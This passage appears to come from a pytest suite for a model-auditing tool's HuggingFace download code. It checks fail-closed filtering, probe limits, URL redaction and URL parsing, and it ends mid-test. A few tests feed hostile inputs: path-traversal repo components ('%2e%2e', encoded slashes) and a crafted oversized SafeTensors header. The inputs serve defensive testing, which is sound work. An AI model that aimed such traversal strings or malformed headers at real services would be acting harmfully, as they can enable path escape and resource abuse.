            "flax-msgpack-near-match",
            "torch7-source-near-match",
            "llamafile-near-match",
            "tensorflow-protobuf-near-match",
            "coreml-protobuf-near-match",
            "onnx-protobuf-near-match",
            "large-invalid-msgpack-near-match",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_benign_content_route_near_matches(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload: bytes,
    ) -> None:
        """Bounded content probes should not pull benign near-match files into snapshots."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @pytest.mark.parametrize(
        ("response_headers", "response_status_code"),
        [
            ({"Content-Range": f"bytes 0-8191/{8 + 1 + (9 * 1024)}"}, 206),
            ({"Content-Length": str(8 + 1 + (9 * 1024))}, 200),
        ],
        ids=["partial-content-range", "full-content-length"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "metadata.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_uses_remote_size_to_reject_truncated_oversized_safetensors(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        response_headers: dict[str, str],
        response_status_code: int,
    ) -> None:
        """A disclosed short file must not satisfy an attacker-sized SafeTensors header."""
        payload = struct.pack("<Q", (16 * 1024 * 1024) + 1) + b"{" + b"\x00" * (9 * 1024)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(
            payload,
            headers=response_headers,
            status_code=response_status_code,
        )

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "weights.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_preserves_disclosed_oversized_safetensors(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A plausible oversized header should remain scannable when it fits the remote file."""
        header_len = (16 * 1024 * 1024) + 1
        payload = struct.pack("<Q", header_len) + b"{" + b"\x00" * (9 * 1024)
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        safetensors_path = download_path / "weights.payload"
        with safetensors_path.open("wb") as handle:
            handle.write(payload)
            handle.truncate(8 + header_len)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(
            payload,
            headers={"Content-Range": f"bytes 0-8191/{8 + header_len}"},
        )

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == [
            "pytorch_model.bin",
            "weights.payload",
        ]
        assert detect_file_format_for_skip_filter(str(safetensors_path)) == "safetensors"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get", side_effect=PermissionError("denied https://huggingface.co/test/model?token=hf_secret"))
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_when_skipped_file_cannot_be_inspected(
        self,
        mock_snapshot_download: MagicMock,
        _mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Skipped remote files must be inspectable before selective filtering excludes them."""
        with pytest.raises(Exception) as excinfo:
            download_model("https://huggingface.co/test/model")

        error = str(excinfo.value)
        assert "selective filtering incomplete" in error
        assert "evil.payload" in error
        assert "hf_secret" not in error
        assert "token=" not in error
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_FILES", 1)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "preview.png", "notes.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_caps_skipped_file_content_probes(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_detect_content: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Selective filtering should fail closed instead of issuing unbounded remote probes."""
        with pytest.raises(Exception, match="skipped file inspection limit exceeded"):
            download_model("https://huggingface.co/test/model")

        mock_detect_content.assert_called_once_with("test/model", "preview.png", _HF_TEST_REVISION, ANY)
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_TOTAL_BYTES", 8 * 1024)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_caps_total_content_probe_bytes(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Selective filtering should fail closed before aggregate remote probes grow unbounded."""
        mock_requests_get.return_value = _FakeRangeResponse(b"{")

        with pytest.raises(Exception, match="skipped file inspection byte limit exceeded"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_called_once()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_success_without_scannable_files_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """A successful listing with no scannable files must not fall back to a full snapshot."""
        cache_dir = tmp_path / "cache"
        download_path = cache_dir / "huggingface" / "test" / "model"

        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        mock_snapshot_download.assert_not_called()
        assert not download_path.exists()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["notes.unknown"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_without_scannable_files_preserves_existing_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Fail-closed listing checks must not delete a user's preexisting cache."""
        cache_dir = tmp_path / "cache"
        download_path = cache_dir / "huggingface" / "test" / "model"
        download_path.mkdir(parents=True)
        cached_file = download_path / "cached.bin"
        cached_file.write_bytes(b"cached")

        with pytest.raises(Exception, match="repository listing contains no recognized ModelAudit-scannable files"):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        mock_snapshot_download.assert_not_called()
        assert cached_file.read_bytes() == b"cached"

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=([], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_empty_listing_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_model_size: MagicMock,
    ) -> None:
        """An empty successful listing should not trigger a full-snapshot download."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["nested/MODEL.SaFeTeNsOrS"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_accepts_mixed_case_scannable_suffix(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Supported remote suffixes should match local case-insensitive routing."""
        download_path = tmp_path / "download"
        model_path = download_path / "nested" / "MODEL.SaFeTeNsOrS"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["nested/MODEL.SaFeTeNsOrS"]

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    @patch("shutil.rmtree")
    def test_download_model_cleanup_on_failure(
        self,
        mock_rmtree: MagicMock,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Test that temporary directory is cleaned up on download failure."""
        # Make snapshot_download raise an exception
        mock_snapshot_download.side_effect = Exception("Download failed")

        # Test download failure
        with pytest.raises(Exception, match="Failed to download model"):
            download_model("https://huggingface.co/test/model")

        # Verify cleanup was attempted (only if temp dir was created)
        # Since we're mocking, we can't verify the exact behavior, but the code handles it

    def test_download_invalid_url(self):
        """Test that invalid URLs raise appropriate errors."""
        with pytest.raises(ValueError):
            download_model("https://github.com/user/repo")

    def test_missing_huggingface_hub_dependency(self):
        """Test error when huggingface-hub is not installed."""
        real_import = __import__
        with patch("builtins.__import__") as mock_import:

            def side_effect(name, *args, **kwargs):
                if name == "huggingface_hub":
                    raise ImportError("No module named 'huggingface_hub'")
                return real_import(name, *args, **kwargs)

            mock_import.side_effect = side_effect
            with pytest.raises(ImportError, match="huggingface-hub package is required"):
                download_model("https://huggingface.co/test/model")


class TestModelDownloadStreaming:
    """Test streaming model downloads from HuggingFace."""

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={"", ".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "README.md"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_downloads_scannable_files_only(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should only request recognized scannable files."""
        downloaded_file = tmp_path / "huggingface" / "test" / "model" / "pytorch_model.bin"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model", cache_dir=tmp_path))

        assert results == [(downloaded_file, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision=_HF_TEST_REVISION,
            cache_dir=str(tmp_path / "huggingface"),
            local_dir=str(tmp_path / "huggingface" / "test" / "model"),
        )

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_includes_content_routed_skipped_file(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should include renamed content-routed model files."""

        def get_side_effect(url: str, **_kwargs: object) -> _FakeRangeResponse:
            if url.endswith("/evil.payload"):
                return _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
            return _FakeRangeResponse(b"\x89PNG\r\n\x1a\n" + b"\x00" * 16)

        def download_side_effect(*, repo_id: str, filename: str, **_kwargs: object) -> str:
            assert repo_id == "test/model"
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_requests_get.side_effect = get_side_effect
        mock_hf_hub_download.side_effect = download_side_effect

        results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(tmp_path / "pytorch_model.bin", False), (tmp_path / "evil.payload", True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "pytorch_model.bin",
            "evil.payload",
        ]
        assert all(call.kwargs["revision"] == _HF_TEST_REVISION for call in mock_hf_hub_download.call_args_list)
        assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".safetensors"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["MODEL.SaFeTeNsOrS"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_accepts_mixed_case_scannable_suffix(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Streaming downloads should recognize mixed-case supported suffixes."""
        downloaded_file = tmp_path / "MODEL.SaFeTeNsOrS"
        mock_hf_hub_download.return_value = str(downloaded_file)

        results = list(download_model_streaming("https://huggingface.co/test/model"))

        assert results == [(downloaded_file, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="MODEL.SaFeTeNsOrS",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "timed out after 30 seconds"),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_timeout_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming mode should fail closed when repo listing times out."""
        with pytest.raises(Exception, match="Timeout listing files in repository test/model"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repository listing unavailable"),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_error_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming mode should fail closed when repo listing errors out."""
        with pytest.raises(
            Exception,
            match="Failed listing files in repository test/model: repository listing unavailable",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["README.md", "notes.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_success_without_scannable_files_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Streaming mode must not download every repo file when no scannable files are listed."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=([], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_empty_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """An empty successful listing should not make streaming mode download all repo files."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], None, "repository listing missing immutable revision"),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_fails_closed_without_immutable_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming filtering must stop before probing or downloading a mutable revision."""
        with pytest.raises(Exception, match="repository listing missing immutable revision"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_not_called()


class TestModelSizeAndDiskSpace:
    """Test model size retrieval and disk space checking."""

    @patch("builtins.__import__")
    def test_get_model_size_import_error(self, mock_import):
        """Test get_model_size returns None when HfApi is not available."""

        def side_effect(name, *args, **kwargs):
            if name == "huggingface_hub":
                raise ImportError("No module")
            return __import__(name, *args, **kwargs)

        mock_import.side_effect = side_effect
        size = get_model_size("test/model")
        assert size is None

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_success(self, mock_hf_api_class):
        """Test successful model size retrieval."""
        # Mock the API and model info
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        # Create mock file info
        mock_file1 = MagicMock()
        mock_file1.size = 1024 * 1024  # 1 MB
        mock_file2 = MagicMock()
        mock_file2.size = 2048 * 1024  # 2 MB

        mock_model_info = MagicMock()
        mock_model_info.siblings = [mock_file1, mock_file2]
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model")
        assert size == 3 * 1024 * 1024  # 3 MB total

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_no_siblings(self, mock_hf_api_class):
        """Test model size when no siblings info available."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        mock_model_info = MagicMock()
        mock_model_info.siblings = None
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model")
        assert size is None

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_api_error(self, mock_hf_api_class):
        """Test model size returns None on API error."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.model_info.side_effect = Exception("API error")

        size = get_model_size("test/model")
        assert size is None

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_insufficient_disk_space(
        self, mock_snapshot_download, mock_check_disk_space, mock_get_model_size, tmp_path
    ):
        """Test download fails gracefully when disk space is insufficient (with custom cache)."""
        # Mock model size
        mock_get_model_size.return_value = 10 * 1024 * 1024 * 1024  # 10 GB

        # Mock disk space check to fail
        mock_check_disk_space.return_value = (False, "Insufficient disk space. Required: 12.0 GB, Available: 5.0 GB")

        # Test download failure with custom cache directory (this enables disk space checking)
        cache_dir = tmp_path / "custom_cache"
        with pytest.raises(Exception, match=r"Cannot download model.*Insufficient disk space"):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        # Verify snapshot_download was not called
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_with_disk_space_check(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test successful download with disk space check when using custom cache."""
        # Mock model size
        mock_get_model_size.return_value = 1024 * 1024 * 1024  # 1 GB

        # Mock disk space check to pass
        mock_check_disk_space.return_value = (True, "Sufficient disk space available (10.0 GB)")

        # Mock snapshot download
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "config.json").write_text("{}")
        (mock_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        # Test download with custom cache directory (this enables disk space checking)
        cache_dir = tmp_path / "custom_cache"
        result = download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        # Verify disk space was checked
        mock_check_disk_space.assert_called_once()

        # Verify download proceeded
        mock_snapshot_download.assert_called_once()
        assert result == mock_path

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch("modelaudit.utils.sources.huggingface._get_hf_cache_root")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_without_cache_dir_checks_default_hf_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_get_hf_cache_root: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Disk preflight should run against the default HF cache root when no cache_dir is supplied."""
        mock_get_model_size.return_value = 1024 * 1024
        mock_check_disk_space.return_value = (True, "Sufficient disk space available")

        hf_cache_root = tmp_path / "hf-cache" / "hub"
        mock_get_hf_cache_root.return_value = hf_cache_root

        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert hf_cache_root.exists()
        mock_check_disk_space.assert_called_once_with(hf_cache_root, 1024 * 1024)


class TestGetModelInfo:
    """Test retrieving model metadata from HuggingFace."""

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_with_author(self, mock_hf_api_class):
        """Ensure author is returned when available."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        model_info = SimpleNamespace(
            modelId="test/model",
            author="test-author",
        )
        mock_api.model_info.return_value = model_info

        # Mock list_repo_tree which is used to get accurate file sizes
        # (implementation skips .gitattributes and README.md)
        mock_api.list_repo_tree.return_value = [
            SimpleNamespace(path="config.json", size=100),
            SimpleNamespace(path="README.md", size=50),  # This will be skipped
        ]

        info = get_model_info("https://huggingface.co/test/model")

        assert info["author"] == "test-author"
        assert info["total_size"] == 100
        assert info["file_count"] == 1

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_without_author(self, mock_hf_api_class):
        """Default to empty string when author is missing."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        model_info = SimpleNamespace(
            siblings=[],
            modelId="test/model",
        )
        mock_api.model_info.return_value = model_info

        info = get_model_info("https://huggingface.co/test/model")

        assert info["author"] == ""


class TestHuggingFaceFileURLs:
    """Test HuggingFace direct file URL handling."""

    def test_redact_file_url_for_display(self):
        """Redact credentials from HuggingFace URLs while keeping useful location context."""
        url = "https://user:pass@huggingface.co/org/repo/resolve/main/model.bin?token=hf_secret#frag"

        redacted = redact_huggingface_url_for_display(url)

        assert redacted == "https://huggingface.co/org/repo/resolve/main/model.bin"
        assert "user" not in redacted
        assert "pass" not in redacted
        assert "token=" not in redacted
        assert "hf_secret" not in redacted
        assert "#frag" not in redacted

    def test_valid_file_urls(self):
        """Test that valid HuggingFace file URLs are detected."""
        valid_urls = [
            "https://huggingface.co/bert-base/uncased/resolve/main/pytorch_model.bin",
            "https://huggingface.co/facebook/bart-large/resolve/main/config.json",
            "https://hf.co/microsoft/DialoGPT/resolve/main/model.safetensors",
            "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/file.bin",  # Percent-encoded revision
            "https://user:pass@huggingface.co/private/repo/resolve/main/model.bin?token=hf_secret",
        ]
        for url in valid_urls:
            assert is_huggingface_file_url(url), f"Failed to detect valid file URL: {url}"

    def test_invalid_file_urls(self):
        """Test that invalid URLs are not detected as HuggingFace file URLs."""
        invalid_urls = [
            "https://huggingface.co/bert-base-uncased",  # Model URL, not file URL
            "https://github.com/user/repo/blob/main/file.bin",  # GitHub, not HuggingFace
            "https://huggingface.co/model/tree/main",  # Tree view, not resolve
            "/path/to/local/file.bin",  # Local path
        ]
        for url in invalid_urls:
            assert not is_huggingface_file_url(url), f"Incorrectly detected invalid file URL: {url}"

    def test_parse_file_urls(self):
        """Test parsing HuggingFace file URLs."""
        test_cases = [
            (
                "https://huggingface.co/bert-base/uncased/resolve/main/pytorch_model.bin",
                ("bert-base/uncased", "main", "pytorch_model.bin"),
            ),
            (
                "https://huggingface.co/microsoft/DialoGPT/resolve/v1.0/config.json",
                ("microsoft/DialoGPT", "v1.0", "config.json"),
            ),
            (
                "https://hf.co/facebook/bart-large/resolve/main/subfolder/model.safetensors",
                ("facebook/bart-large", "main", "subfolder/model.safetensors"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/file.bin",
                ("user/repo", "refs/pr/1", "file.bin"),  # Percent-decoded revision
            ),
            (
                "https://user:pass@huggingface.co/private/repo/resolve/main/model.bin?token=hf_secret",
                ("private/repo", "main", "model.bin"),
            ),
        ]
        for url, expected in test_cases:
            repo_id, branch, filename = parse_huggingface_file_url(url)
            assert (repo_id, branch, filename) == expected, f"Failed to parse file URL: {url}"

    def test_parse_invalid_file_urls(self):
        """Test that invalid file URLs raise ValueError."""
        invalid_urls = [
            "https://github.com/user/repo/blob/main/file.bin",
            "https://huggingface.co/model",  # Missing resolve path
            "https://huggingface.co/model/tree/main/file.bin",  # Wrong path structure
        ]
        for url in invalid_urls:
            with pytest.raises(ValueError):
                parse_huggingface_file_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/%2e%2e/repo/resolve/main/model.bin",
            "https://huggingface.co/org/%2e%2e/resolve/main/model.bin",
            "https://huggingface.co/org/repo%2Fescape/resolve/main/model.bin",
        ],
    )
    def test_parse_file_url_rejects_unsafe_repo_components(self, url: str) -> None:
        """Direct file URLs should validate repo-id components before download."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_success(self, mock_hf_hub_download):
        """Test successful file download from HuggingFace."""
        mock_path = "/tmp/downloaded_file.bin"
        mock_hf_hub_download.return_value = mock_path

        url = "https://huggingface.co/test/model/resolve/main/pytorch_model.bin"
        result = download_file_from_hf(url)

        # Verify the download was called correctly
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="pytorch_model.bin",
            revision="main",
            cache_dir=None,
        )
        assert result == Path(mock_path)

    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_cache_dir(self, mock_hf_hub_download, tmp_path):
        """Test file download with custom cache directory."""
        mock_path = str(tmp_path / "downloaded_file.bin")
        mock_hf_hub_download.return_value = mock_path

        cache_dir = tmp_path / "custom_cache"
        url = "https://huggingface.co/test/model/resolve/main/config.json"
        download_file_from_hf(url, cache_dir=cache_dir)

        # Verify cache directory was used
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="config.json",
            revision="main",
            cache_dir=str(cache_dir),
        )

    @patch("huggingface_hub.HfApi")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_file_with_max_size_preflights_before_download(
        self,
